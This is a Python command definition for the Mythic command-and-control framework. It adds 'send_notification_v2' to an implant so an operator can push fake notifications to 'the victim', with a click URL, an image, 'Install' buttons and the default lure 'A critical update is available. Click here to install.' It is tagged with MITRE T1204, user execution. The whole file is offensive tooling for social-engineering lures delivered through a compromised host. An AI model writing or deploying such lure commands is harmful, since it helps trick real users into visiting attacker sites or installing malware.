from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class SendNotificationV2Arguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="title",
                type=ParameterType.String,
                description="Notification title",
                default_value="Update available",
            ),
            CommandParameter(
                name="message",
                type=ParameterType.String,
                description="Notification body",
                default_value="A critical update is available. Click here to install.",
            ),
            CommandParameter(
                name="type",
                type=ParameterType.String,
                description="Notification type (basic or image)",
                default_value="basic",
                choices=["basic", "image"],
            ),
            CommandParameter(
                name="click_url",
                type=ParameterType.String,
                description="URL opened when the victim clicks the notification",
                default_value="",
            ),
            CommandParameter(
                name="image_url",
                type=ParameterType.String,
                description="Image URL (only for type=image)",
                default_value="",
            ),
            CommandParameter(
                name="buttons",
                type=ParameterType.String,
                description=(
                    "Optional JSON array of buttons, e.g. "
                    '[{"title":"Install","url":"https://..."}]'
                ),
                default_value="",
            ),
            CommandParameter(
                name="require_interaction",
                type=ParameterType.Boolean,
                description="Keep the notification on screen until dismissed",
                default_value=True,
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class SendNotificationV2Command(CommandBase):
    cmd = "send_notification_v2"
    needs_admin = False
    help_cmd = "send_notification_v2 [title] [message] [type] [click_url] [image_url] [buttons]"
    description = (
        "Show a full-featured notification lure (image/list/progress, click URL, "
        "action buttons) to the victim."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1204"]
    argument_class = SendNotificationV2Arguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
